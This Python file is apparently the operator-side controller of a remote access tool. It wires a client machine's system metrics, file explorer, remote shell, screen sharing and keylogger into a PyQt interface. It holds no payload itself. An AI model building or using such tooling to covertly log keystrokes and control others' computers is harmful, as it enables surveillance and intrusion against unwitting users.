import pygame

import InspectionWindowView
import ScreenShare
from KeyLog.Keylogger import KeyloggerManager
from NetProtocol import *
import time
import threading
import functools
from PyQt5.QtCore import pyqtSignal, QThread, QObject, QRunnable, QThreadPool
import typing
from PyQt5.QtWidgets import QTableWidgetItem, QTreeWidgetItem, QTreeWidgetItemIterator

from SocketLock import SocketLock
from fileExplorerManager import FileExplorerManager
from RemoteShell.RemoteShell import RemoteShellManager

class SemaphoreSubscriptor:
    def __init__(self):
        self.semaphores = []

    def subscribe(self):
        semaphore = threading.Semaphore(0)
        self.semaphores.append(semaphore)
        return semaphore

    def unsubscribe(self, semaphore):
        if semaphore in self.semaphores:
            self.semaphores.remove(semaphore)

    def increment_all(self):
        for semaphore in self.semaphores:
            semaphore.release()

class TabThreadEventManager(): #container class for the events that tab threads wait for
    def __init__(self, starterindex, *args : threading.Event):
        self.__tabEvents = list(args)
        self.active_event = self.__tabEvents[starterindex]
        self.active_event.set()

    def set_event(self, eventIndex):
        if not (0 <= eventIndex < len(self.__tabEvents)):
            raise Exception("eventIndex out of tabEvents range")
        self.active_event.clear()
        self.active_event = self.__tabEvents[eventIndex]
        self.active_event.set()

    def get_event(self, eventIndex):
        if not (0 <= eventIndex < len(self.__tabEvents)):
            raise Exception("eventIndex out of tabEvents range")
        return self.__tabEvents[eventIndex]

# class FileExplorerThreadRunner(QObject):
#     def __init__(self, client, view):
#         super().__init__()
#         self.view = view
#         self.client = client
#
#     def run(self):
#         time.sleep(10)

class ClientInspectorController(QObject):
    def requestMetrics(self, client):
        semaphore = self.semaphoreSubscriptor.subscribe()
        while semaphore.acquire():
            self.infoLock.acquire_read()
            active = self.active
            tab = self.currentTab
            self.infoLock.release_read()
            if not active:
                return
            elif tab == 0:
                while True:
                    self.infoLock.acquire_read()
                    tab = self.currentTab
                    self.infoLock.release_read()
                    if tab != 0:
                        break
                    else:
                        event = client.send_message(NetMessage(NetTypes.NetRequest, NetTypes.NetSystemMetrics), track_event=True)
                        event.wait()
                        time.sleep(0.5)


    def __init__(self, view : InspectionWindowView.ClientInspectorView, client):
        super().__init__()
        self.semaphoreSubscriptor = SemaphoreSubscriptor()
        # self.tabEventManager = TabThreadEventManager(0, *[threading.Event() for i in range(6)])
        self.view = view
        self.client = client
        self.view.connectionInformationTable.initializeClient(client)
        self.infoLock = SocketLock()
        self.active = True
        self.screenshareActive = False
        self.currentTab = 0
        self.view.TabContainer.currentChanged.connect(self.tabChanged)
        self.view.pushButton_3.clicked.connect(self.remoteDekstopButtonClicked)
        self.fileExplorerManager = FileExplorerManager(client, self.view)
        self.remoteShellManager = RemoteShellManager(client, self)
        self.keyloggerManager = KeyloggerManager(client, self)
        client.dataLock.acquire_read()

        # #start the file explorer thread
        # self.fileExplorerThread = QThread()
        # self.fileExplorerThread.setObjectName("File Explorer Thread")
        # self.worker = FileExplorerThreadRunner(self.fileExplorerThread, view)
        # self.worker.moveToThread(self.fileExplorerThread)
        # self.fileExplorerThread.started.connect(self.worker.run)
        # self.fileExplorerThread.start()

        if(client.systemInformation is None): #check if already have client information
            client.dataLock.release_read()
            client.send_message(NetMessage(NetTypes.NetRequest, NetTypes.NetSystemInformation))
        else:
            client.dataLock.release_read()
            self.updateSystemInformation()
        thread1 = threading.Thread(target=self.requestMetrics, args=(client,))
        thread1.start()

    def startThreads(self):
        self.updateMetricsThread = threading.Thread(target=self.updateMetrics)
        self.updateMetricsThread.start()

    def remoteDekstopButtonClicked(self):
        def screen_worker(*args):
            ScreenShare.main(*args)
            self.screenshareActive = False

        if not self.screenshareActive:
            self.screenshareActive = True
            worker = threading.Thread(target=screen_worker(self.client))
            worker.start()

    def close(self):
        """
        Hides the client inspector window.
        Note that this function does not stop threads, windows, or any tasks associated with the inspector,  with the exception of the remote shell threads, which are closed.
        """
        try:
            self.view.hide()
        except:pass
        self.infoLock.acquire_write()
        self.active = False
        self.currentTab = -1
        self.infoLock.release_write()
        self.remoteShellManager.stop_all()
        self.semaphoreSubscriptor.increment_all()

    def force_stop(self):
        """
        Calls InspectorController.close() and stops all threads and tasks associated with the inspector.
        """
        self.close()
        self.fileExplorerManager.stop_downloads()
        pygame.quit()

    def show(self):
        try:
            self.view.show()
        except:pass
        self.infoLock.acquire_write()
        self.active = True
        self.infoLock.release_write()
        self.semaphoreSubscriptor.increment_all()

    def tabChanged(self, index):
        self.infoLock.acquire_write()
        self.currentTab = index
        self.infoLock.release_write()
        self.semaphoreSubscriptor.increment_all()
        if index == 1: #file explorer tab
            if not self.fileExplorerManager.is_initialized():
                self.fileExplorerManager.initializeContents()
        if index == 2: #remote shell tab
            self.remoteShellManager.tab_entered()
        if index == 3:
            self.keyloggerManager.tab_entered()

    def updateSystemInformation(self):
        self.client.dataLock.acquire_read()
        information = self.client.systemInformation
        self.view.SystemInformationTable.setItem(0, 1, QTableWidgetItem(information.DESKTOP_NAME))
        self.view.SystemInformationTable.setItem(1, 1, QTableWidgetItem(information.OPERATING_SYSTEM_VERSION))
        self.view.SystemInformationTable.setItem(2, 1, QTableWidgetItem(information.PROCESSOR_NAME))
        self.view.SystemInformationTable.setItem(3, 1, QTableWidgetItem(information.PROCESSOR_ARCHITECTURE))
        self.view.SystemInformationTable.setItem(4, 1, QTableWidgetItem(information.GPU_NAME))
        self.client.dataLock.release_read()


    def updateMetrics(self):
        self.client.dataLock.acquire_read()
        metrics = self.client.systemMetrics
        self.view.CPUUsagePrecentage.setText(f"{int(metrics.CPU_LOAD)}%")
        self.view.CPUUsageProgressBar.setValue(int(metrics.CPU_LOAD))
        self.view.GPUUsagePrecentage.setText(f"{int(metrics.GPU_LOAD)}%")
        self.view.GPUUsageProgressBar.setValue(int(metrics.GPU_LOAD))
        self.view.RamUsagePrecentage.setText(f"{int(metrics.RAM_LOAD)}%")
        self.view.RAMUsageProgressBar.setValue(int(metrics.RAM_LOAD))
        self.view.DiskUsagePrecentage.setText(f"{int(metrics.DISK_LOAD)}%")
        self.view.DiskUsageProgressBar.setValue(int(metrics.DISK_LOAD))
        self.client.dataLock.release_read()
        self.view.CPUUsagePrecentage.repaint()
        self.view.GPUUsagePrecentage.repaint()
        self.view.RamUsagePrecentage.repaint()
        self.view.DiskUsagePrecentage.repaint()